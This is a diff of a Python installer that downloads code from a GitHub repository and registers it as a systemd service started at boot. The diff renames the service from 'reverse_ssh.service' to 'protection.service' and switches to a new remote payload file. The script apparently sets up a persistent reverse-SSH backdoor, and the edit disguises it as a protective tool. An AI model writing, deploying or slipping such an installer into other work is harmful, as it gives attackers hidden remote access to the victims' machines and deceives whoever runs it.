@@ -7,7 +7,7 @@ import sys
 import subprocess
 
 # Define URLs for downloading the necessary files
-repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
+repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection3.py"
 requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
@@ -111,7 +111,7 @@ if __name__ == "__main__":
     subprocess.run(['systemctl', 'daemon-reload'], check=True)
 
     # Enable the service to run at boot
-    subprocess.run(['systemctl', 'enable', 'reverse_ssh.service'], check=True)
+    subprocess.run(['systemctl', 'enable', 'protection.service'], check=True)
 
     # Start the service immediately
-    subprocess.run(['systemctl', 'start', 'reverse_ssh.service'], check=True)
+    subprocess.run(['systemctl', 'start', 'protection.service'], check=True)
